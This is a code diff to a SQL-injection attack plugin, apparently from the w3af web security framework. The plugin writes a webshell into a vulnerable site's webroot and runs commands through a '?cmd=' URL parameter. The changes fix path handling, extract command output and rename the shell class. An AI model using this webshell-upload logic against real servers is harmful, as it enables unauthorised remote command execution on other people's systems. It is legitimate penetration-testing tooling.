@@ -222,11 +222,16 @@ class sql_webshell(baseAttackPlugin):
             # target's webroot!
             webshell_url = self._upload_webshell( driver, vuln_obj )
             if webshell_url:
+                # Define the corresponding cut...
+                response = self._urlOpener.GET( webshell_url )
+                self._defineCut( response.getBody(), payloads.SHELL_IDENTIFIER , exact=True )
+                
                 # Create the shell object
                 # Set shell parameters
-                shell_obj = mysql_web_shell( vuln_obj )
+                shell_obj = sql_web_shell( vuln_obj )
                 shell_obj.setUrlOpener( self._urlOpener )
                 shell_obj.setWebShellURL( webshell_url )
+                shell_obj.setCut( self._header, self._footer )
                 return shell_obj
             else:
                 # Sad face :(
@@ -249,6 +254,8 @@ class sql_webshell(baseAttackPlugin):
         # First, we test if we can upload a file into a directory we can access:
         webroot_dirs = get_webroot_dirs( urlParser.getDomain(vuln_obj.getURL()) )
         for webroot in webroot_dirs:
+            
+            if upload_success: break
             
             # w3af found a lot of directories, and we are going to use that knowledgeBase
             # because one of the dirs may be writable and one may not!
@@ -278,6 +285,8 @@ class sql_webshell(baseAttackPlugin):
         # just need to upload a webshell that works in that environment!
         if upload_success:
             
+            om.out.console('Trying to write a webshell.')
+            
             # Get the extension from the vulnerable script
             extension = urlParser.getExtension( vuln_obj.getURL() )
             
@@ -287,16 +296,16 @@ class sql_webshell(baseAttackPlugin):
                 # previous for loop:
                 remote_path = remote_path[:remote_path.rfind('/')]
                 filename = createRandAlNum( 8 )
-                remote_path += filename + '.' + real_extension
+                remote_path += '/' + filename + '.' + real_extension
                 
                 # And now do "the same thing" with the URL
                 test_url = test_url[:test_url.rfind('/')]
-                test_url += filename + '.' + real_extension + '?cmd='
+                test_url += '/' + filename + '.' + real_extension + '?cmd='
                 
                 # Upload & test
                 if self._upload_file( driver, remote_path, file_content, test_url, payloads.SHELL_IDENTIFIER):
                     # Complete success!
-                    om.out.console('Successfully executed a webshell in the target server!')
+                    om.out.console('Successfully installed a webshell in the target server!')
                     return test_url
                     
         return None
@@ -443,7 +452,7 @@ class sql_webshell(baseAttackPlugin):
             - equalLimit
         '''
 
-class mysql_web_shell(shell):
+class sql_web_shell(shell):
     def setWebShellURL( self, eu ):
         self._webshell_url = eu
     
@@ -460,10 +469,10 @@ class mysql_web_shell(shell):
         '''
         to_send = self.getWebShellURL() + urllib.quote_plus( command )
         response = self._urlOpener.GET( to_send )
-        return response.getBody()
+        return self._cut(response.getBody())
     
     def end( self ):
-        om.out.debug('mysql_web_shell cleanup complete.')
+        om.out.debug('sql_web_shell cleanup complete.')
         
     def getName( self ):
-        return 'mysql_web_shell'
+        return 'sql_web_shell'
